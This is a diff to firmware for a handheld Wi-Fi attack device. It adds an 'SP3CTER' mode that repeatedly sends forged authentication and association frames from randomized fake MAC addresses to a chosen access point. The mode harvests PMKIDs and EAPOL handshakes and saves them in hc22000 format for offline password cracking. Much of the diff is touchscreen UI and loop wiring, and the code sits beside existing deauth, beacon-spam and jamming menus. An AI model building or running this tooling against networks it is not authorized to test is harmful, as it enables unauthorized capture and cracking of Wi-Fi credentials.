+  const uint32_t now = millis();
+
+  // Ghost sequence: Auth → 150ms pause → Assoc, every 8s
+  if (now - specterLastGhostMs >= 8000U) {
+    specterLastGhostMs   = now;
+    specterGhostSentMs   = now;
+    specterGhostInFlight = true;
+    specterAssocSent     = false;
+    specterRandomizeSta();
+    specterSendGhostAuth();
+    specterGhostCount++;
+    Serial.printf("[SP3CTER] ghost #%lu auth sent (pmkids=%u clients=%u)\n",
+                  (unsigned long)specterGhostCount, specterPmkidCount, specterClientCount);
+  }
+  // Send Assoc 150 ms after Auth
+  if (specterGhostInFlight && !specterAssocSent && (now - specterGhostSentMs >= 150U)) {
+    specterSendGhostAssoc();
+    specterAssocSent = true;
+  }
+  // Reset ghost window after 3 s
+  if (specterGhostInFlight && (now - specterGhostSentMs >= 3000U)) {
+    specterGhostInFlight = false;
+  }
+}
+
 static void disengageAutoMode() {
   if (autoMode == AutoMode::NONE) return;
-  
+
   Serial.printf("[auto] stopping %s mode\n", autoModeStr(autoMode));
   
   // Stop packet capture and close files
@@ -6238,6 +6660,12 @@ static void disengageAutoMode() {
     push1tBssidCached = false;
     Serial.printf("[PUSH1T] stopped probes=%lu wps=%d vuln=%d\n",
                   (unsigned long)push1tProbeCount, push1tWpsDetected, push1tVulnerable);
+  } else if (autoMode == AutoMode::SP3CTER) {
+    specterGhostInFlight = false;
+    specterWriteHc22000(); // flush any remaining PMKIDs
+    Serial.printf("[SP3CTER] stopped ghosts=%lu pmkids=%u clients=%u hs_tracks=%u\n",
+                  (unsigned long)specterGhostCount, specterPmkidCount,
+                  specterClientCount, specterHsCount);
   }
 
   // Clear mode
@@ -6263,8 +6691,8 @@ static void engageAutoMode(AutoMode mode) {
     startSniff();
   }
 
-  rawCaptureActive = (mode == AutoMode::RAW || mode == AutoMode::JAMMIT);
-  pcapCaptureActive = (mode == AutoMode::RAW || mode == AutoMode::JAMMIT || mode == AutoMode::Y0INK);
+  rawCaptureActive = (mode == AutoMode::SP3CTER || mode == AutoMode::JAMMIT);
+  pcapCaptureActive = (mode == AutoMode::SP3CTER || mode == AutoMode::JAMMIT || mode == AutoMode::Y0INK);
   if (rawCaptureActive) rawLastLogMs = 0;
   if (pcapCaptureActive && sdReady && !pcapFilesOpen) initCaptureFiles();
 
@@ -6282,8 +6710,31 @@ static void engageAutoMode(AutoMode mode) {
     yoinkHandshakeCaptureCount = 0;
     yoinkLastDeauthMs = millis();
     yoinkDeauthCount = 0;
-  } else if (mode == AutoMode::RAW) {
-    Serial.println("[auto] RAW engaged (logging snapshots)");
+  } else if (mode == AutoMode::SP3CTER) {
+    // Reset all SP3CTER state
+    specterPmkidCount    = 0;
+    specterHsCount       = 0;
+    specterClientCount   = 0;
+    specterDedupHead     = 0;
+    specterGhostCount    = 0;
+    specterLastGhostMs   = 0;
+    specterGhostInFlight = false;
+    specterAssocSent     = false;
+    memset(specterDedup,     0, sizeof(specterDedup));
+    memset(specterPmkids,    0, sizeof(specterPmkids));
+    memset(specterHsTracks,  0, sizeof(specterHsTracks));
+    memset(specterClientMacs,0, sizeof(specterClientMacs));
+    specterLogHead  = 0;
+    specterLogCount = 0;
+    memset(specterEventLog, 0, sizeof(specterEventLog));
+    specterRandomizeSta();
+    {
+      char logbuf[34];
+      snprintf(logbuf, sizeof(logbuf), "Session started CH:%d", target.channel);
+      specterLogAdd(logbuf, 0x07FF);  // cyan
+    }
+    Serial.printf("[SP3CTER] engaged: target='%s' ch=%d\n",
+                  target.ssid.c_str(), target.channel);
   } else if (mode == AutoMode::SCOPE) {
     scopeResetWaterfall();
     scopeScanActive = false;
@@ -9849,7 +10300,7 @@ static void monitorReset() {
     monitorPushLine(TFT_GREEN, "YOINK engine active");
   } else if (autoMode == AutoMode::JAMMIT) {
     monitorPushLine(TFT_RED, "JAMMIT telemetry active (safe)");
-  } else if (autoMode == AutoMode::RAW) {
+  } else if (autoMode == AutoMode::SP3CTER) {
     monitorPushLine(TFT_CYAN, "RAW CAPTURE active");
   }
   monitorPushLine(TFT_WHITE, "Waiting for data...");
@@ -10191,7 +10642,7 @@ static void monitorTick() {
     if (!armed) {
       monitorPushLine(TFT_YELLOW, "WAIT lock=%d sniff=%d rec=%d",
                       lockChannel ? 1 : 0, sniffActive ? 1 : 0, (rawCaptureActive || pcapCaptureActive) ? 1 : 0);
-    } else if (autoMode == AutoMode::RAW) {
+    } else if (autoMode == AutoMode::SP3CTER) {
       // RAW mode: in-place updates, only redraw when data changes
       bool changed = false;
       
@@ -12057,21 +12508,22 @@ void drawBruceMenu() {
   bruceMenuBtns[1] = {zoneLeft + btnW + gapX, row1Y, btnW, btnH, "Beacon Spam"};
   bruceMenuBtns[2] = {zoneLeft,               row2Y, btnW, btnH, "Probe Flood"};
   bruceMenuBtns[3] = {zoneLeft + btnW + gapX, row2Y, btnW, btnH, "Deauth All"};
-  // PUSH!T and Set Target (row 3)
+  // Row 3: PUSH!T | SP3CTER
   bruceMenuBtns[4] = {zoneLeft,               row3Y, btnW, btnH, "PUSH!T"};
-  bruceMenuBtns[5] = {zoneLeft + btnW + gapX, row3Y, btnW, btnH, "Set Target"};
-  // Back/Stop (row 4, full-width)
-  bruceMenuBtns[6] = {zoneLeft,               row4Y, zoneW, btnH,
+  bruceMenuBtns[5] = {zoneLeft + btnW + gapX, row3Y, btnW, btnH, "SP3CTER"};
+  // Row 4: Set Target | Back/Stop
+  bruceMenuBtns[6] = {zoneLeft,               row4Y, btnW, btnH, "Set Target"};
+  bruceMenuBtns[7] = {zoneLeft + btnW + gapX, row4Y, btnW, btnH,
                       bruceIsAttacking() ? "STOP" : "Back"};
-  bruceMenuBtns[7] = {0, 0, 0, 0, ""};  // unused placeholder
 
-  drawButton(bruceMenuBtns[0], TFT_BLACK, 0xFF07, TFT_WHITE);
-  drawButton(bruceMenuBtns[1], TFT_BLACK, 0xFF07, TFT_WHITE);
-  drawButton(bruceMenuBtns[2], TFT_BLACK, 0xFF07, TFT_WHITE);
-  drawButton(bruceMenuBtns[3], TFT_BLACK, 0xF800, TFT_WHITE);
+  drawButton(bruceMenuBtns[0], TFT_BLACK, 0xFF07,      TFT_WHITE);
+  drawButton(bruceMenuBtns[1], TFT_BLACK, 0xFF07,      TFT_WHITE);
+  drawButton(bruceMenuBtns[2], TFT_BLACK, 0xFF07,      TFT_WHITE);
+  drawButton(bruceMenuBtns[3], TFT_BLACK, 0xF800,      TFT_WHITE);
   drawButton(bruceMenuBtns[4], TFT_BLACK, TFT_MAGENTA, TFT_WHITE);
-  drawButton(bruceMenuBtns[5], TFT_BLACK, TFT_NAVY,    TFT_WHITE);
-  drawButton(bruceMenuBtns[6], TFT_BLACK,
+  drawButton(bruceMenuBtns[5], TFT_BLACK, 0x07FF,      TFT_BLACK);  // cyan — SP3CTER
+  drawButton(bruceMenuBtns[6], TFT_BLACK, TFT_NAVY,    TFT_WHITE);
+  drawButton(bruceMenuBtns[7], TFT_BLACK,
              bruceIsAttacking() ? 0xFC00 : 0x07E0, TFT_WHITE);
 
   drawBorder();
@@ -12279,6 +12731,374 @@ static void push1tScreenTick_UI(int tx, int ty) {
     setScreen(ScreenId::BRUCE_MENU);
     waitTouchRelease();
     return;
+  }
+  waitTouchRelease();
+}
+
+// ============================================================
+//  SP3CTER standalone screen
+// ============================================================
+
+static void drawSpecter() {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("NEONDRIVE :: SP3CTER");
+  drawUniversalBackground();
+
+  const UiRect bottom  = computeBottomBarRect();
+  const int    cY      = computeContentRect().y;  // top of content area
+  const int    cH      = bottom.y - cY - 2;       // height of content area
+  const int    mL      = UI_SAFE_MARGIN;           // left margin
+  const int    mR      = UI_SAFE_MARGIN;           // right margin
+  const int    scrW    = tft.width();
+  const int    usable  = scrW - mL - mR;          // total usable width
+  const int    colGap  = 5;
+
+  // Three columns: Left (target + ghost) | Center (PMKID + log) | Right (clients + HS)
+  const int lW = max(100, usable * 28 / 100);          // ~28%
+  const int rW = max(90,  usable * 32 / 100);          // ~32%
+  const int cW = usable - lW - rW - colGap * 2;        // remainder
+  const int lX = mL;
+  const int cX = lX + lW + colGap;
+  const int rX = cX + cW + colGap;
+
+  const bool engaged = (autoMode == AutoMode::SP3CTER);
+
+  tft.setTextDatum(TL_DATUM);
+  tft.setTextSize(1);
+
+  // ═══════════════════════════════════════════════════════════════
+  //  LEFT COLUMN — Selected Target + Ghost Status + HC path
+  // ═══════════════════════════════════════════════════════════════
+
+  // ── Target card ──────────────────────────────────────────────
+  const int tgtCardH = min(90, cH * 38 / 100);
+  tft.drawRoundRect(lX, cY, lW, tgtCardH, 4, 0x07FF);  // cyan border
+  tft.setTextColor(0x07FF, TFT_BLACK);
+  tft.drawString("SELECTED TARGET", lX + 4, cY + 3);
+  tft.drawFastHLine(lX + 1, cY + 12, lW - 2, 0x07FF);
+
+  if (hasTarget) {
+    String ssid = target.ssid.isEmpty() ? String("(hidden)") : target.ssid;
+    while (ssid.length() > 4 && tft.textWidth(ssid.c_str()) > lW - 8)
+      ssid.remove(ssid.length() - 1);
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.drawString(ssid.c_str(), lX + 4, cY + 15);
+
+    // Lock icon if encrypted
+    if (target.auth != WIFI_AUTH_OPEN) {
+      tft.setTextColor(0x07E0, TFT_BLACK);
+      tft.drawString("[ENC]", lX + lW - 32, cY + 15);
+    }
+
+    char bssidBuf[20];
+    strncpy(bssidBuf, target.bssid.c_str(), 19);
+    tft.setTextColor(0x7BEF, TFT_BLACK);
+    tft.drawString(bssidBuf, lX + 4, cY + 27);
+
+    char chRssi[24];
+    snprintf(chRssi, sizeof(chRssi), "CH:%-3d  %d dBm", target.channel, target.rssi);
+    tft.setTextColor(0x07FF, TFT_BLACK);
+    tft.drawString(chRssi, lX + 4, cY + 39);
+
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.drawString(authToStr(target.auth), lX + 4, cY + 51);
+
+    // Vendor / Auth short
+    char secBuf[22];
+    snprintf(secBuf, sizeof(secBuf), "RSSI: %d dBm", target.rssi);
+    tft.setTextColor(0x7BEF, TFT_BLACK);
+    tft.drawString(secBuf, lX + 4, cY + 63);
+
+  } else {
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.drawString("No target set", lX + 4, cY + 22);
+    tft.setTextColor(0x7BEF, TFT_BLACK);
+    tft.drawString("Press SET TGT below", lX + 4, cY + 34);
+  }
+
+  // ── Ghost Status panel ────────────────────────────────────────
+  const int ghostY = cY + tgtCardH + 5;
+  const int ghostH = min(58, cH * 24 / 100);
+  tft.drawRoundRect(lX, ghostY, lW, ghostH, 3, 0xF81F);  // magenta border
+  tft.setTextColor(0xF81F, TFT_BLACK);
+  tft.drawString("GHOST TRIGGER", lX + 4, ghostY + 3);
+  tft.drawFastHLine(lX + 1, ghostY + 12, lW - 2, 0xF81F);
+
+  char ghostCtr[28];
+  snprintf(ghostCtr, sizeof(ghostCtr), "Sent: %lu", (unsigned long)specterGhostCount);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.drawString(ghostCtr, lX + 4, ghostY + 16);
+
+  const char* ghostStatus;
+  uint16_t ghostStatusCol;
+  if (!engaged) {
+    ghostStatus = "IDLE (not engaged)";
+    ghostStatusCol = 0x7BEF;
+  } else if (specterGhostInFlight && !specterAssocSent) {
+    ghostStatus = "FIRING: auth sent";
+    ghostStatusCol = 0xF81F;
+  } else if (specterGhostInFlight && specterAssocSent) {
+    ghostStatus = "FIRING: assoc sent";
+    ghostStatusCol = 0xF81F;
+  } else {
+    const uint32_t nextMs = 8000 - min(8000UL, (unsigned long)(millis() - specterLastGhostMs));
+    char nbuf[28]; snprintf(nbuf, sizeof(nbuf), "Next in %lus", (unsigned long)(nextMs / 1000));
+    ghostStatus = nbuf;
+    ghostStatusCol = 0x07FF;
+    tft.setTextColor(ghostStatusCol, TFT_BLACK);
+    tft.drawString(ghostStatus, lX + 4, ghostY + 28);
+    ghostStatus = nullptr;  // drawn inline above
+  }
+  if (ghostStatus) {
+    tft.setTextColor(ghostStatusCol, TFT_BLACK);
+    tft.drawString(ghostStatus, lX + 4, ghostY + 28);
+  }
+
+  // Fake STA MAC
+  char fakeMAC[22];
+  snprintf(fakeMAC, sizeof(fakeMAC), "%02x:%02x:%02x:%02x:%02x:%02x",
+           specterFakeStaMac[0], specterFakeStaMac[1], specterFakeStaMac[2],
+           specterFakeStaMac[3], specterFakeStaMac[4], specterFakeStaMac[5]);
+  tft.setTextColor(0x7BEF, TFT_BLACK);
+  tft.drawString(fakeMAC, lX + 4, ghostY + 40);
+
+  // ── hc22000 status ───────────────────────────────────────────
+  const int hcY = ghostY + ghostH + 5;
+  if (specterPmkidCount > 0 && captureDir[0]) {
+    tft.setTextColor(0x07E0, TFT_BLACK);
+    tft.drawString("HC22000:", lX + 4, hcY);
+    char hcPath[60];
+    snprintf(hcPath, sizeof(hcPath), "%s/specter.hc", captureDir);
+    String hcl = hcPath;
+    while (hcl.length() > 4 && tft.textWidth(hcl.c_str()) > lW - 4)
+      hcl.remove(hcl.length() - 1);
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.drawString(hcl.c_str(), lX + 4, hcY + 11);
+    char frameBuf[24];
+    snprintf(frameBuf, sizeof(frameBuf), "Frames: %u PMKIDs", specterPmkidCount);
+    tft.setTextColor(0x07E0, TFT_BLACK);
+    tft.drawString(frameBuf, lX + 4, hcY + 22);
+  } else {
+    tft.setTextColor(0x7BEF, TFT_BLACK);
+    tft.drawString("No PMKIDs captured yet", lX + 4, hcY);
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  CENTER COLUMN — PMKID Hero + Live Log
+  // ═══════════════════════════════════════════════════════════════
+
+  // ── PMKID harvest hero ────────────────────────────────────────
+  const int heroSectionH = cH * 42 / 100;
+  tft.drawRoundRect(cX, cY, cW, heroSectionH, 4, 0x07E0);  // green border
+  tft.setTextColor(0x07E0, TFT_BLACK);
+  tft.drawString("PMKID HARVEST", cX + 4, cY + 3);
+  tft.drawFastHLine(cX + 1, cY + 12, cW - 2, 0x07E0);
+
+  // Big PMKID count using font 6 (7-seg style)
+  tft.setTextDatum(MC_DATUM);
+  tft.setTextFont(6);
+  tft.setTextSize(1);
+  tft.setTextColor(specterPmkidCount > 0 ? 0x07E0 : 0x39C7, TFT_BLACK);
+  char pmkBig[12];
+  snprintf(pmkBig, sizeof(pmkBig), "%06lu", (unsigned long)specterPmkidCount);
+  tft.drawString(pmkBig, cX + cW / 2, cY + 14 + 24);  // 24px = ~half font height
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setTextColor(specterPmkidCount > 0 ? 0x07E0 : 0x7BEF, TFT_BLACK);
+  tft.drawString("PMKIDs COLLECTED", cX + cW / 2, cY + 14 + 52);
+  tft.setTextDatum(TL_DATUM);
+
+  // First PMKID preview (if any)
+  if (specterPmkidCount > 0) {
+    const uint8_t* p0 = specterPmkids[0].pmkid;
+    char prev[34];
+    snprintf(prev, sizeof(prev), "%02x%02x%02x%02x%02x%02x%02x%02x...",
+             p0[0],p0[1],p0[2],p0[3],p0[4],p0[5],p0[6],p0[7]);
+    tft.setTextColor(0x07E0, TFT_BLACK);
+    tft.drawString(prev, cX + 4, cY + 14 + 62);
+  }
+
+  // ── Live log ──────────────────────────────────────────────────
+  const int logY = cY + heroSectionH + 5;
+  const int logH = bottom.y - logY - 4;
+  tft.drawRoundRect(cX, logY, cW, logH, 3, 0xFFE0);  // yellow border
+  tft.setTextColor(0xFFE0, TFT_BLACK);
+  tft.drawString("LIVE LOG", cX + 4, logY + 3);
+  tft.drawFastHLine(cX + 1, logY + 12, cW - 2, 0xFFE0);
+
+  // Draw log entries newest-first from the ring, oldest at bottom
+  const int logLineH = 9;
+  const int logLinesVisible = max(1, (logH - 15) / logLineH);
+  const int logStart = logY + 15;
+  // Iterate from newest to oldest, draw top-down
+  const int logTotal = min((int)specterLogCount, logLinesVisible);
+  for (int i = 0; i < logTotal; i++) {
+    // Entry index (newest=0 means head-1, oldest=logTotal-1)
+    int idx = ((int)specterLogHead - 1 - i + SPECTER_LOG_MAX) % SPECTER_LOG_MAX;
+    tft.setTextColor(specterEventLog[idx].color, TFT_BLACK);
+    // Clip text to column width
+    String line = specterEventLog[idx].text;
+    while (line.length() > 2 && tft.textWidth(line.c_str()) > cW - 6)
+      line.remove(line.length() - 1);
+    tft.drawString(line.c_str(), cX + 4, logStart + i * logLineH);
+  }
+  if (specterLogCount == 0) {
+    tft.setTextColor(0x7BEF, TFT_BLACK);
+    tft.drawString("Waiting for frames...", cX + 4, logStart);
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  RIGHT COLUMN — Clients Seen + Handshake Completeness Table
+  // ═══════════════════════════════════════════════════════════════
+
+  const int clientSectionH = cH * 40 / 100;
+  tft.drawRoundRect(rX, cY, rW, clientSectionH, 4, 0x07FF);  // cyan border
+  char clientHdr[28];
+  snprintf(clientHdr, sizeof(clientHdr), "CLIENTS SEEN   %u", specterClientCount);
+  tft.setTextColor(0x07FF, TFT_BLACK);
+  tft.drawString(clientHdr, rX + 4, cY + 3);
+  tft.drawFastHLine(rX + 1, cY + 12, rW - 2, 0x07FF);
+
+  // Client MAC list
+  const int clRowH = 10;
+  const int clVisible = max(1, (clientSectionH - 16) / clRowH);
+  for (int i = 0; i < min((int)specterClientCount, clVisible); i++) {
+    const uint8_t* m = specterClientMacs[i];
+    char macBuf[22];
+    snprintf(macBuf, sizeof(macBuf), "%02x:%02x:%02x:%02x:%02x:%02x",
+             m[0],m[1],m[2],m[3],m[4],m[5]);
+    // Check if this client has a PMKID
+    bool hasPmkid = false;
+    for (uint8_t p = 0; p < specterPmkidCount; p++)
+      if (memcmp(specterPmkids[p].staMac, m, 6) == 0) { hasPmkid = true; break; }
+    tft.setTextColor(hasPmkid ? 0x07E0 : TFT_WHITE, TFT_BLACK);
+    String ms = macBuf;
+    while (ms.length() > 4 && tft.textWidth(ms.c_str()) > rW - 6) ms.remove(ms.length() - 1);
+    tft.drawString(ms.c_str(), rX + 4, cY + 15 + i * clRowH);
+  }
+  if (specterClientCount == 0) {
+    tft.setTextColor(0x7BEF, TFT_BLACK);
+    tft.drawString("No clients yet", rX + 4, cY + 18);
+  }
+
+  // ── Handshake Completeness Table ─────────────────────────────
+  const int hsY = cY + clientSectionH + 5;
+  const int hsH = bottom.y - hsY - 4;
+  tft.drawRoundRect(rX, hsY, rW, hsH, 3, 0xF800);  // red border (urgency)
+  tft.setTextColor(0xFFE0, TFT_BLACK);
+  tft.drawString("HS COMPLETENESS", rX + 4, hsY + 3);
+  tft.drawFastHLine(rX + 1, hsY + 12, rW - 2, 0x7BEF);
+
+  // Column header
+  const int hsTblX  = rX + 4;
+  const int hsTblY  = hsY + 15;
+  const int hsColW  = (rW - 8) / 6;  // 6 cols: MAC short, M1 M2 M3 M4 P
+  tft.setTextColor(0x7BEF, TFT_BLACK);
+  tft.drawString("CLIENT", hsTblX,              hsTblY);
+  tft.drawString("M1",     hsTblX + hsColW * 2, hsTblY);
+  tft.drawString("M2",     hsTblX + hsColW * 3, hsTblY);
+  tft.drawString("M3",     hsTblX + hsColW * 4, hsTblY);
+  tft.drawString("M4",     hsTblX + hsColW * 5, hsTblY);
+
+  const int hsRowH2   = 10;
+  const int hsVisible = max(1, (hsH - 26) / hsRowH2);
+  for (int i = 0; i < min((int)specterHsCount, hsVisible); i++) {
+    const SpecterHsTrack& t = specterHsTracks[i];
+    int ry = hsTblY + 10 + i * hsRowH2;
+    char shortMac[10];
+    snprintf(shortMac, sizeof(shortMac), "%02x:%02x", t.staMac[4], t.staMac[5]);
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.drawString(shortMac, hsTblX, ry);
+
+    auto indicator = [&](int xOff, bool v) {
+      if (v) {
+        tft.setTextColor(0x07E0, TFT_BLACK);
+        tft.drawString("\x18", hsTblX + xOff, ry);  // checkmark approx
+      } else {
+        tft.setTextColor(0xF800, TFT_BLACK);
+        tft.drawString("-", hsTblX + xOff, ry);
+      }
+    };
+    indicator(hsColW * 2, t.m1);
+    indicator(hsColW * 3, t.m2);
+    indicator(hsColW * 4, t.m3);
+    indicator(hsColW * 5, t.m4);
+  }
+  if (specterHsCount == 0) {
+    tft.setTextColor(0x7BEF, TFT_BLACK);
+    tft.drawString("No EAPOL captured", hsTblX, hsTblY + 12);
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  BOTTOM BAR — 4 action buttons
+  // ═══════════════════════════════════════════════════════════════
+  const int btnCount = 4;
+  const int btnGap   = 4;
+  const int btnW4    = (bottom.w - btnGap * (btnCount - 1)) / btnCount;
+
+  btnSpEngage    = {bottom.x + 0*(btnW4+btnGap), bottom.y, btnW4, bottom.h,
+                    engaged ? "STOP" : "ENGAGE"};
+  btnSpGhost     = {bottom.x + 1*(btnW4+btnGap), bottom.y, btnW4, bottom.h, "GHOST NOW"};
+  btnSpSetTarget = {bottom.x + 2*(btnW4+btnGap), bottom.y, btnW4, bottom.h, "SET TGT"};
+  btnSpBack      = {bottom.x + 3*(btnW4+btnGap), bottom.y, btnW4, bottom.h, "BACK"};
+
+  // ENGAGE/STOP: green when idle, red when active
+  drawButton(btnSpEngage,    engaged ? TFT_MAROON    : 0x0340,  // dark red / dark green bg
+             engaged         ? 0xF800              : 0x07E0,  // red / green border
+             TFT_WHITE);
+  drawButton(btnSpGhost,     0x000F,  0xF81F, TFT_WHITE);  // navy/magenta
+  drawButton(btnSpSetTarget, 0x0010,  0x07FF, TFT_WHITE);  // dark navy/cyan
+  drawButton(btnSpBack,      0x180E,  0x07FF, TFT_WHITE);  // midnight/cyan
+
+  // (btnSpPktLab not shown in new layout — handled by BACK→Packet Lab from home)
+  btnSpPktLab = {0, 0, 0, 0, ""};  // zero out to prevent ghost hits
+
+  // ── Render signature ─────────────────────────────────────────
+  uint32_t sig = 2166136261u;
+  auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
+  mix((uint32_t)specterPmkidCount);
+  mix((uint32_t)specterHsCount);
+  mix((uint32_t)specterClientCount);
+  mix((uint32_t)(specterGhostCount & 0xFF));
+  mix((uint32_t)specterLogHead);
+  mix((uint32_t)autoMode);
+  mix((uint32_t)hasTarget);
+  mix((uint32_t)specterGhostInFlight);
+  specterScreenLastSig = sig;
+
+  drawBorder();
+}
+
+static void specterScreenTick_UI(int tx, int ty) {
+  if (screen != ScreenId::SP3CTER_SCREEN) return;
+
+  if (hit(btnSpBack, tx, ty)) {
+    if (autoMode == AutoMode::SP3CTER) disengageAutoMode();
+    setScreen(ScreenId::HOME);
+    waitTouchRelease(); return;
+  }
+  if (hit(btnSpEngage, tx, ty)) {
+    if (autoMode == AutoMode::SP3CTER) disengageAutoMode();
+    else if (hasTarget)                engageAutoMode(AutoMode::SP3CTER);
+    drawSpecter(); waitTouchRelease(); return;
+  }
+  if (hit(btnSpGhost, tx, ty)) {
+    // Fire one ghost sequence immediately regardless of engage state
+    specterRandomizeSta();
+    specterSendGhostAuth();
+    specterGhostCount++;
+    specterGhostSentMs   = millis();
+    specterGhostInFlight = true;
+    specterAssocSent     = false;
+    drawSpecter(); waitTouchRelease(); return;
+  }
+  if (hit(btnSpSetTarget, tx, ty)) {
+    setScreen(ScreenId::WIFI_SCAN);
+    waitTouchRelease(); return;
+  }
+  if (hit(btnSpPktLab, tx, ty)) {
+    setScreen(ScreenId::BRUCE_MENU);
+    waitTouchRelease(); return;
   }
   waitTouchRelease();
 }
@@ -12821,7 +13641,7 @@ static void bruceMenuTick_UI(int tx, int ty) {
 
   if (bruceIsAttacking()) {
     // Only allow STOP button when attacking
-    if (hit(bruceMenuBtns[6], tx, ty)) {
+    if (hit(bruceMenuBtns[7], tx, ty)) {
       Serial.println("[BRUCE] STOP ATTACK pressed");
       bruceStopAttack();
       drawBruceMenu();
@@ -12840,8 +13660,16 @@ static void bruceMenuTick_UI(int tx, int ty) {
     return;
   }
 
-  // Check Set Target button
+  // Check SP3CTER button — no Bruce target needed
   if (hit(bruceMenuBtns[5], tx, ty)) {
+    Serial.println("[ui] Packet Lab -> SP3CTER");
+    setScreen(ScreenId::SP3CTER_SCREEN);
+    waitTouchRelease();
+    return;
+  }
+
+  // Check Set Target button
+  if (hit(bruceMenuBtns[6], tx, ty)) {
     Serial.println("[BRUCE] Set Target pressed");
     setScreen(ScreenId::BRUCE_SET_TARGET);
     waitTouchRelease();
@@ -12849,7 +13677,7 @@ static void bruceMenuTick_UI(int tx, int ty) {
   }
 
   // Check Back button
-  if (hit(bruceMenuBtns[6], tx, ty)) {
+  if (hit(bruceMenuBtns[7], tx, ty)) {
     Serial.println("[BRUCE] Back to Home");
     setScreen(ScreenId::HOME);
     waitTouchRelease();
@@ -13292,6 +14120,7 @@ static void setScreen(ScreenId next) {
       drawRecon();
       break;
     case ScreenId::PUSH1T_SCREEN:     push1tProbeCount = 0; push1tLastProbeMs = 0; drawPush1t(); break;
+    case ScreenId::SP3CTER_SCREEN:    drawSpecter(); break;
     case ScreenId::BRUCE_MENU:        drawBruceMenu(); break;
     case ScreenId::BRUCE_SET_TARGET:  bruceTargetScroll = 0; drawBruceSetTarget(); break;
     case ScreenId::SCOPE_GRAPH:
@@ -13355,6 +14184,7 @@ static void redrawActiveScreen() {
     case ScreenId::WARDRIVE:            drawWardrive(); break;
     case ScreenId::ABOUT:               drawAbout(); break;
     case ScreenId::PUSH1T_SCREEN:       drawPush1t(); break;
+    case ScreenId::SP3CTER_SCREEN:      drawSpecter(); break;
     case ScreenId::BRUCE_MENU:          drawBruceMenu(); break;
     case ScreenId::BRUCE_MONITOR:       drawBruceMonitor(); break;
     case ScreenId::BRUCE_SET_TARGET:    drawBruceSetTarget(); break;
@@ -14087,6 +14917,7 @@ void loop() {
   jammitModeTick();
   yoinkModeTick();
   push1tTick();
+  specterTick();
   justGoTick();
   
   // Refresh PUSH1T screen when active and state has changed
@@ -14102,6 +14933,23 @@ void loop() {
     mix((uint32_t)hasTarget);
     if (sig != push1tScreenLastSig) {
       drawPush1t();
+    }
+  }
+
+  // Refresh SP3CTER screen when active and state has changed
+  if (screen == ScreenId::SP3CTER_SCREEN) {
+    uint32_t sig = 2166136261u;
+    auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
+    mix((uint32_t)specterPmkidCount);
+    mix((uint32_t)specterHsCount);
+    mix((uint32_t)specterClientCount);
+    mix((uint32_t)(specterGhostCount & 0xFF));
+    mix((uint32_t)specterLogHead);
+    mix((uint32_t)autoMode);
+    mix((uint32_t)hasTarget);
+    mix((uint32_t)specterGhostInFlight);
+    if (sig != specterScreenLastSig) {
+      drawSpecter();
     }
   }
 
@@ -14126,6 +14974,9 @@ void loop() {
     mix((uint32_t)justGoSessionAttempts);
     mix((uint32_t)push1tWpsDetected);
     mix((uint32_t)push1tVulnerable);
+    mix((uint32_t)specterPmkidCount);
+    mix((uint32_t)specterHsCount);
+    mix((uint32_t)(specterGhostCount & 0xFF));
     if (sig != justGoLastRenderSig) {
       drawJustGo();
       justGoLastConsoleLineCount = monitorLineCount;
@@ -14506,6 +15357,12 @@ void loop() {
   // PUSH1T screen
   if (screen == ScreenId::PUSH1T_SCREEN) {
     push1tScreenTick_UI(tx, ty);
+    return;
+  }
+
+  // SP3CTER screen
+  if (screen == ScreenId::SP3CTER_SCREEN) {
+    specterScreenTick_UI(tx, ty);
     return;
   }
 
@@ -14921,7 +15778,7 @@ void loop() {
     }
     if (hit(btnAutoRAW, tx, ty)) {
       if (!confirmWebRiskAction(RiskyWebAction::AUTO_RAW, "Engage RAW")) { waitTouchRelease(); return; }
-      engageAutoMode(AutoMode::RAW); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
+      engageAutoMode(AutoMode::SP3CTER); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
     }
     if (hit(btnAutoSCOPE, tx, ty)) {
       if (!confirmWebRiskAction(RiskyWebAction::AUTO_SCOPE, "Engage SCOPE")) { waitTouchRelease(); return; }
